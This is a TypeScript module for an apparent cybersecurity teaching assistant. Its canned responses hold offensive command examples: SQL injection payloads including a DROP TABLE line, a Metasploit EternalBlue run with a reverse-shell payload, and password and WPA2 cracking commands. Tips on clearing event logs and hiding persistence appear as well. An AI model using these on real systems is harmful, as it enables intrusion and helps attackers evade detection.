import fs from 'fs';
import path from 'path';
import { geminiAPI } from './gemini-api';

// ── Types ────────────────────────────────────────────────────────────────────

interface CommandEntry {
  command: string;
  description: string;
  syntax: string;
  examples: string[];
  output_format: string;
  difficulty: string;
}

interface CommandCategory {
  name: string;
  icon: string;
  commands: CommandEntry[];
}

interface AiPromptConfig {
  system_prompt: string;
  personality: {
    tone: string;
    expertise: string;
    ethics: string;
    communication: string;
  };
  response_templates: Record<string, string>;
  learning_prompts: string[];
  ethical_guidelines: string[];
}

interface InteractiveScenario {
  title: string;
  description: string;
  steps: string[];
  tools: string[];
  expected_time: string;
}

interface CommandsData {
  categories: Record<string, CommandCategory>;
  ai_prompts: AiPromptConfig;
  interactive_scenarios: Record<string, InteractiveScenario[]>;
}

export interface CommandResponse {
  type: 'command_explanation' | 'security_analysis' | 'tool_recommendation' | 'general_response' | 'ai_enhanced_response';
  content: string;
  category?: string;
  difficulty?: string;
  tools?: string[];
  legal_notice?: boolean;
}

// ── Commands data loader ─────────────────────────────────────────────────────

let commandsData: CommandsData | null = null;

function loadCommandsData(): CommandsData {
  if (!commandsData) {
    try {
      const commandsPath = path.join(import.meta.dirname || process.cwd(), '..', 'cybershell-commands', 'commands.json');
      const rawData = fs.readFileSync(commandsPath, 'utf8');
      commandsData = JSON.parse(rawData) as CommandsData;
    } catch (error) {
      console.error('Error loading commands data:', error);
      commandsData = {
        categories: {},
        ai_prompts: { system_prompt: '', personality: { tone: '', expertise: '', ethics: '', communication: '' }, response_templates: {}, learning_prompts: [], ethical_guidelines: [] },
        interactive_scenarios: {},
      };
    }
  }
  return commandsData;
}

// ── CyberShellAI ─────────────────────────────────────────────────────────────

export class CyberShellAI {
  private commands: CommandsData;
  
  constructor() {
    this.commands = loadCommandsData();
  }

  processCommand(userInput: string): CommandResponse {
    const input = userInput.toLowerCase().trim();
    
    if (input.includes('scan') && (input.includes('network') || input.includes('nmap'))) {
      return this.explainNetworkScanning();
    }
    
    if (input.includes('vulnerabilit') || input.includes('vuln')) {
      return this.explainVulnerabilityAssessment();
    }
    
    if (input.includes('sql') && input.includes('inject')) {
      return this.explainSQLInjection();
    }
    
    if (input.includes('metasploit') || input.includes('exploit')) {
      return this.explainMetasploit();
    }
    
    if (input.includes('wireshark') || input.includes('traffic') || input.includes('packet')) {
      return this.explainNetworkAnalysis();
    }
    
    if (input.includes('password') && (input.includes('crack') || input.includes('hash'))) {
      return this.explainPasswordCracking();
    }
    
    if (input.includes('forensic') || input.includes('memory') || input.includes('volatility')) {
      return this.explainForensics();
    }
    
    if (input.includes('wireless') || input.includes('wifi') || input.includes('aircrack')) {
      return this.explainWirelessSecurity();
    }
    
    if (input.includes('system') && (input.includes('info') || input.includes('check'))) {
      return this.explainSystemAnalysis();
    }
    
    if (input.includes('security') || input.includes('protect') || input.includes('secure')) {
      return this.provideSecurityGuidance();
    }
    
    return this.provideGeneralGuidance();
  }

  private explainNetworkScanning(): CommandResponse {
    const explanation = `🌐 **Network Scanning with Nmap**

**Purpose:** Discover active hosts and services on a network

**Basic Commands:**
\`\`\`bash
# Host Discovery
nmap -sn 192.168.1.0/24

# Port Scan
nmap -sS -p 1-1000 target_ip

# Service Detection
nmap -sV -p 22,80,443 target_ip

# OS Detection
nmap -O target_ip
\`\`\`

**Scanning Techniques:**
- **TCP SYN Scan (-sS)**: Stealthy, doesn't complete connections
- **TCP Connect Scan (-sT)**: Full connection, more detectable
- **UDP Scan (-sU)**: Scans UDP ports (slower)
- **Aggressive Scan (-A)**: OS detection + version detection + scripts

**Output Analysis:**
- **Open**: Service actively accepting connections
- **Closed**: Port reachable but no service listening
- **Filtered**: Firewall/filter blocking probe packets

**Legal Considerations:**
⚠️ Only scan networks you own or have explicit written permission to test.
Unauthorized scanning may violate laws and network policies.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'networking',
      difficulty: 'intermediate',
      tools: ['nmap', 'masscan', 'zmap'],
      legal_notice: true
    };
  }

  private explainVulnerabilityAssessment(): CommandResponse {
    const explanation = `🛡️ **Vulnerability Assessment Process**

**Automated Scanning:**
\`\`\`bash
# Nmap vulnerability scripts
nmap --script vuln target_ip

# Nikto web server scanner
nikto -h http://target.com

# OpenVAS/Greenbone scan
gvm-cli socket --xml="<get_tasks/>"
\`\`\`

**Manual Testing Checklist:**
1. **Information Gathering**
   - DNS enumeration
   - WHOIS lookups
   - Social media reconnaissance

2. **Network Assessment**
   - Port scanning
   - Service fingerprinting
   - Protocol analysis

3. **Application Testing**
   - Input validation
   - Authentication bypass
   - Session management

4. **Configuration Review**
   - Default credentials
   - Unnecessary services
   - Patch levels

**Risk Classification:**
- **Critical**: Immediate threat to system security
- **High**: Significant risk requiring prompt attention
- **Medium**: Moderate risk, address in planned maintenance
- **Low**: Minor issues for future consideration

**Reporting Format:**
- Executive summary with business impact
- Technical details with proof-of-concept
- Risk ratings and remediation timeline
- Defensive recommendations

⚠️ **Authorization Required**: Always obtain proper written authorization before testing.`;

    return {
      type: 'security_analysis',
      content: explanation,
      category: 'assessment',
      difficulty: 'intermediate',
      tools: ['nmap', 'nikto', 'openvas', 'nessus'],
      legal_notice: true
    };
  }

  private explainSQLInjection(): CommandResponse {
    const explanation = `💉 **SQL Injection Testing & Prevention**

**Detection Techniques:**
\`\`\`bash
# SQLMap automated testing
sqlmap -u "http://target.com/page.php?id=1"

# Manual testing payloads
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
'; DROP TABLE users; --
\`\`\`

**Types of SQL Injection:**
1. **Union-based**: Combines results from multiple queries
2. **Boolean-based**: Uses true/false responses
3. **Time-based**: Uses database delays for confirmation
4. **Error-based**: Extracts data from error messages

**SQLMap Advanced Usage:**
\`\`\`bash
# Database enumeration
sqlmap -u "URL" --dbs

# Table enumeration
sqlmap -u "URL" -D database_name --tables

# Data extraction
sqlmap -u "URL" -D db_name -T table_name --dump
\`\`\`

**Prevention Measures:**
1. **Parameterized Queries**: Use prepared statements
2. **Input Validation**: Whitelist acceptable characters
3. **Least Privilege**: Database user with minimal permissions
4. **WAF Protection**: Web Application Firewall rules
5. **Regular Updates**: Keep database software current

**Example Secure Code (PHP):**
\`\`\`php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
\`\`\`

⚠️ **Ethical Testing**: Only test applications you own or have permission to assess.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'exploitation',
      difficulty: 'intermediate',
      tools: ['sqlmap', 'burp-suite', 'owasp-zap'],
      legal_notice: true
    };
  }

  private explainMetasploit(): CommandResponse {
    const explanation = `🎯 **Metasploit Framework Usage**

**Starting Metasploit:**
\`\`\`bash
# Launch console
msfconsole

# Update database
msfdb init && msfdb start
\`\`\`

**Basic Commands:**
\`\`\`bash
# Search for exploits
search type:exploit platform:windows

# Select exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS 192.168.1.100

# Set payload
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50

# Execute exploit
exploit
\`\`\`

**Module Types:**
1. **Exploits**: Code that takes advantage of vulnerabilities
2. **Payloads**: Code executed after successful exploitation
3. **Auxiliary**: Scanning, fuzzing, and other helper modules
4. **Encoders**: Obfuscate payloads to avoid detection
5. **NOPs**: No-operation code for buffer alignment

**Meterpreter Commands:**
\`\`\`bash
# System information
sysinfo

# Process list
ps

# Upload/download files
upload /path/to/local/file C:\\\\Windows\\\\Temp\\\\

# Screenshot
screenshot

# Privilege escalation
getsystem
\`\`\`

**Operational Security:**
- Use staged payloads for larger binaries
- Enable encryption for C2 communications
- Clear event logs and traces
- Use legitimate processes for persistence

⚠️ **Legal Authorization**: Only use on systems you own or have explicit permission to test.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'exploitation',
      difficulty: 'advanced',
      tools: ['metasploit', 'meterpreter', 'msfvenom'],
      legal_notice: true
    };
  }

  private explainNetworkAnalysis(): CommandResponse {
    const explanation = `📊 **Network Traffic Analysis**

**Wireshark Fundamentals:**
\`\`\`bash
# Command line capture
tshark -i eth0 -w capture.pcap

# Live analysis
tshark -i eth0 -f "port 80"

# Read capture file
tshark -r capture.pcap -Y "http"
\`\`\`

**Display Filters:**
\`\`\`
# HTTP traffic
http

# Specific IP address
ip.addr == 192.168.1.100

# TCP traffic on port 443
tcp.port == 443

# DNS queries
dns.flags.response == 0

# Failed TCP connections
tcp.flags.reset == 1
\`\`\`

**Protocol Analysis:**
1. **TCP Stream Analysis**
   - Follow TCP streams for complete conversations
   - Analyze connection establishment and teardown
   - Identify retransmissions and errors

2. **HTTP Analysis**
   - Extract credentials from unencrypted traffic
   - Analyze headers for security misconfigurations
   - Identify file transfers and downloads

3. **DNS Analysis**
   - Monitor for DNS tunneling
   - Identify malicious domains
   - Analyze resolution patterns

**Network Forensics Workflow:**
1. **Collection**: Capture or acquire network data
2. **Preservation**: Maintain chain of custody
3. **Analysis**: Examine traffic patterns and content
4. **Documentation**: Record findings and evidence
5. **Presentation**: Prepare reports for stakeholders

⚠️ **Privacy Considerations**: Only capture traffic on networks you own or have authorization to monitor.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'networking',
      difficulty: 'intermediate',
      tools: ['wireshark', 'tshark', 'tcpdump', 'networkminer'],
      legal_notice: true
    };
  }

  private explainPasswordCracking(): CommandResponse {
    const explanation = `🔐 **Password Security & Hash Cracking**

**Hashcat Usage:**
\`\`\`bash
# Dictionary attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# Brute force attack
hashcat -m 1000 -a 3 ntlm_hashes.txt ?a?a?a?a?a?a

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r best64.rule

# Combinator attack
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt
\`\`\`

**Common Hash Types:**
- **MD5 (-m 0)**: 32 hex characters
- **SHA1 (-m 100)**: 40 hex characters
- **NTLM (-m 1000)**: Windows password hashes
- **bcrypt (-m 3200)**: Strong adaptive hash function
- **WPA2 (-m 22000)**: Wireless network passwords

**Password Security Best Practices:**
- **Length**: Minimum 12 characters
- **Complexity**: Mix of uppercase, lowercase, numbers, symbols
- **Uniqueness**: Different passwords for each account
- **Storage**: Use password managers
- **2FA**: Enable two-factor authentication

**Enterprise Password Policies:**
- Regular password changes (90-180 days)
- Account lockout after failed attempts
- Password history prevention
- Complexity requirements enforcement
- Breach monitoring and notification

⚠️ **Legal Notice**: Only crack hashes you own or have explicit permission to test. Unauthorized access is illegal.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'crypto',
      difficulty: 'intermediate',
      tools: ['hashcat', 'john', 'hydra', 'medusa'],
      legal_notice: true
    };
  }

  private explainForensics(): CommandResponse {
    const explanation = `🔍 **Digital Forensics & Memory Analysis**

**Volatility Framework:**
\`\`\`bash
# Identify OS profile
volatility -f memory.dump imageinfo

# List running processes
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Network connections
volatility -f memory.dump --profile=Win7SP1x64 netscan

# Command line history
volatility -f memory.dump --profile=Win7SP1x64 cmdline

# Malware detection
volatility -f memory.dump --profile=Win7SP1x64 malfind
\`\`\`

**Forensic Analysis Process:**
1. **Acquisition**: Create bit-for-bit copies
2. **Preservation**: Maintain evidence integrity
3. **Analysis**: Extract and examine artifacts
4. **Documentation**: Record all findings
5. **Presentation**: Prepare court-ready reports

**Disk Forensics with Autopsy:**
- **Timeline Analysis**: Chronological file activity
- **Keyword Search**: Find relevant evidence
- **Hash Analysis**: Identify known files
- **Registry Analysis**: Windows system artifacts
- **Email Recovery**: Deleted message reconstruction

**Legal Considerations:**
- Chain of custody maintenance
- Evidence authentication procedures
- Expert testimony preparation
- Court admissibility standards
- Privacy and warrant requirements

⚠️ **Professional Ethics**: Follow legal procedures and respect privacy rights during investigations.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'forensics',
      difficulty: 'advanced',
      tools: ['volatility', 'autopsy', 'sleuthkit', 'encase'],
      legal_notice: true
    };
  }

  private explainWirelessSecurity(): CommandResponse {
    const explanation = `📡 **Wireless Network Security Assessment**

**Aircrack-ng Suite:**
\`\`\`bash
# Enable monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Crack WPA2 password
aircrack-ng -w wordlist.txt capture-01.cap
\`\`\`

**Wireless Security Protocols:**
1. **WEP (Deprecated)**: Easily crackable, avoid use
2. **WPA/WPA2**: Strong when using complex passwords
3. **WPA3**: Latest standard with enhanced security
4. **Enterprise (802.1X)**: Certificate-based authentication

**Wireless Security Best Practices:**
- Use WPA3 or WPA2 with strong passwords
- Disable WPS (Wi-Fi Protected Setup)
- Enable MAC address filtering (limited effectiveness)
- Regular firmware updates for access points
- Monitor for unauthorized access points

⚠️ **Legal Authorization**: Only test wireless networks you own or have written permission to assess.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'wireless',
      difficulty: 'advanced',
      tools: ['aircrack-ng', 'kismet', 'wifite', 'reaver'],
      legal_notice: true
    };
  }

  private explainSystemAnalysis(): CommandResponse {
    const explanation = `⚙️ **System Security Analysis**

**System Information Gathering:**
\`\`\`bash
# Windows system info
systeminfo
wmic os get Caption,Version,BuildNumber

# Linux system info
uname -a
cat /etc/os-release
lscpu && free -h && df -h
\`\`\`

**Security Configuration Review:**
\`\`\`bash
# Windows security policies
secpol.msc
gpresult /h report.html

# Linux security settings
sudo -l

# Firewall status
ufw status (Ubuntu)
firewall-cmd --list-all (CentOS/RHEL)
\`\`\`

**System Hardening Checklist:**
- **Remove default accounts**: Delete or disable unused accounts
- **Strong password policies**: Enforce complexity requirements
- **Principle of least privilege**: Minimal necessary permissions
- **Regular updates**: Apply security patches promptly
- **Audit logging**: Enable comprehensive monitoring
- **Backup strategy**: Regular, tested backups
- **Encryption**: Protect data at rest and in transit

**Incident Response Preparation:**
- Document baseline system state
- Establish monitoring thresholds
- Create incident response procedures
- Test backup and recovery processes
- Train staff on security protocols

⚠️ **System Safety**: Always test changes in non-production environments first.`;

    return {
      type: 'command_explanation',
      content: explanation,
      category: 'system',
      difficulty: 'beginner',
      tools: ['systeminfo', 'netstat', 'ps', 'top', 'journalctl'],
      legal_notice: false
    };
  }

  private provideSecurityGuidance(): CommandResponse {
    const guidance = `🛡️ **Cybersecurity Best Practices**

**Defense in Depth Strategy:**
1. **Physical Security**: Secure facilities and hardware
2. **Network Security**: Firewalls, IDS/IPS, segmentation
3. **Endpoint Security**: Antivirus, EDR, device management
4. **Application Security**: Secure coding, testing, WAF
5. **Data Security**: Encryption, DLP, classification
6. **Identity Management**: Authentication, authorization, SSO
7. **Monitoring**: SIEM, logging, threat intelligence

**Security Framework Implementation:**
- **NIST Cybersecurity Framework**: Identify, Protect, Detect, Respond, Recover
- **ISO 27001**: Information security management systems
- **CIS Controls**: Critical security controls for effective cyber defense
- **OWASP Top 10**: Web application security risks

**Compliance Considerations:**
- **GDPR**: Data privacy and protection (EU)
- **HIPAA**: Healthcare information protection (US)
- **PCI DSS**: Payment card industry standards
- **SOX**: Financial reporting controls (US)
- **ISO 27001**: International security standards

Remember: Security is a journey, not a destination. Stay informed about emerging threats and continuously improve your security posture.`;

    return {
      type: 'general_response',
      content: guidance,
      category: 'security',
      difficulty: 'beginner',
      tools: ['security-frameworks', 'compliance-tools', 'monitoring-systems'],
      legal_notice: false
    };
  }

  private provideGeneralGuidance(): CommandResponse {
    const guidance = `🤖 **CyberShellX AI Assistant**

I'm here to help you with cybersecurity topics! I can provide guidance on:

**🌐 Network Security:**
- Network scanning and reconnaissance
- Traffic analysis and monitoring
- Firewall configuration and testing

**🎯 Penetration Testing:**
- Vulnerability assessment methodologies
- Exploitation techniques and tools
- Post-exploitation and persistence

**🔍 Digital Forensics:**
- Memory analysis and artifact recovery
- Disk forensics and timeline analysis
- Network forensics and incident response

**🔐 Cryptography:**
- Hash cracking and password security
- Encryption implementation and testing
- PKI and certificate management

**📡 Wireless Security:**
- Wi-Fi security assessment
- Bluetooth and RF analysis
- Mobile device security

**⚙️ System Security:**
- Security configuration review
- Log analysis and monitoring
- Hardening and compliance

**Available Commands:**
- \`scan network\` - Network discovery techniques
- \`check vulnerabilities\` - Vulnerability assessment
- \`sql injection\` - Web application security
- \`crack passwords\` - Password security testing
- \`analyze memory\` - Digital forensics
- \`wireless security\` - Wi-Fi assessment
- \`system info\` - Security configuration

Type a specific command or ask about any cybersecurity topic!

⚠️ **Important**: Always ensure you have proper authorization before testing or assessing any systems.`;

    return {
      type: 'general_response',
      content: guidance,
      category: 'general',
      difficulty: 'beginner',
      tools: ['cybershellx-ai'],
      legal_notice: true
    };
  }

  /** Get random learning prompt for interactive engagement */
  getRandomLearningPrompt(): string {
    const prompts = this.commands.ai_prompts?.learning_prompts ?? [];
    return prompts[Math.floor(Math.random() * prompts.length)] ?? 
           "What cybersecurity topic would you like to learn about today?";
  }

  /** Get ethical guidelines */
  getEthicalGuidelines(): string[] {
    return this.commands.ai_prompts?.ethical_guidelines ?? [];
  }

  /** Enhance a base response with Gemini AI */
  async enhanceResponseWithAI(userInput: string, baseResponse: CommandResponse): Promise<CommandResponse> {
    try {
      const prompt = `You are CyberShellX AI, an expert cybersecurity assistant. 
User asked: "${userInput}"
Base response: "${baseResponse.content}"

Enhance this response with:
1. More technical details if appropriate
2. Practical examples
3. Security best practices
4. Educational context

Keep the response concise but informative (max 300 words).`;

      const enhancedContent = await geminiAPI.generateContent(prompt);
      
      return {
        ...baseResponse,
        content: enhancedContent,
        type: 'ai_enhanced_response'
      };
    } catch (error) {
      console.error('AI enhancement failed:', error);
      return baseResponse;
    }
  }

  /** Get current AI API status */
  getAIStatus(): { total: number; current: string; available: string[] } {
    return geminiAPI.getStatus();
  }

  /** Get an interactive scenario by difficulty level */
  getInteractiveScenario(difficulty: 'beginner' | 'intermediate' | 'advanced'): InteractiveScenario | null {
    const scenarios = this.commands.interactive_scenarios?.[difficulty] ?? [];
    return scenarios[Math.floor(Math.random() * scenarios.length)] ?? null;
  }
}

// Export singleton instance
export const cyberShellAI = new CyberShellAI();
